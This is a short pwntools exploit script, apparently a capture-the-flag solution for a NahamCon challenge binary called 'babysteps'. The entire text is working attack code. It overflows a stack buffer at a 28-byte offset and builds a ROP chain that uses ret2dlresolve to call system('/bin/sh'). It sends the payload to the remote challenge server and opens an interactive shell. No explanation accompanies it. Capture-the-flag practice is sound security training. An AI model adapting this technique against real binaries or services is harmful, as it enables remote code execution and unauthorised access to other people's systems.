from pwn import *

binary = ELF("./babysteps")

offset = 28

dl = Ret2dlresolvePayload(binary, symbol='system', args=['/bin/sh'])

rop = ROP(binary)
rop.gets(dl.data_addr)
rop.ret2dlresolve(dl)

#p = process(binary.path)

p = remote("challenge.nahamcon.com", 30584)

payload  = b''
payload += offset * b'A'
payload += rop.chain()
payload += b'\n'
payload += dl.payload
payload += p32(0x0804900a)

p.recvuntil(b"baby name?\n")

p.sendline(payload)
p.interactive()
